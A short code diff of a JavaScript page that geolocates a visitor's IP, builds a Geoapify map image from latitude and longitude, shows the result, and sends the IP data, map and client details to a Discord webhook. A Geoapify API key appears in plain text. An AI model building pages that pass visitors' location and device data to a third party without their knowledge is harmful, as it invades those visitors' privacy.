@@ -47,6 +47,13 @@
       return `https://api.geoapify.com/v1/ipinfo?ip=${ip}&apiKey=225ecbbf50c7433ba647097eeddf3f9b`;
       }
 
+
+
+    
+    function getMapImageURL(lat, lon) {
+      return `https://maps.geoapify.com/v1/staticmap?style=osm-bright-smooth&width=600&height=400&center=lonlat:${lon},${lat}&zoom=14&apiKey=225ecbbf50c7433ba647097eeddf3f9b`;
+    }
+
     // Envoie toutes les infos au webhook Discord
     async function sendToDiscord(ipData, mapImageURL, clientInfo) {
       const payload = {
@@ -98,7 +105,7 @@
         return;
       }
       console.log(ipData)
-      const mapImageURL = getMapImageURLip(ipData.ip);
+      const mapImageURL = getMapImageURL(ipData.latitude, ipData.longitude);
       const clientInfo = getClientInfo();
 
       displayInfo(ipData, mapImageURL);
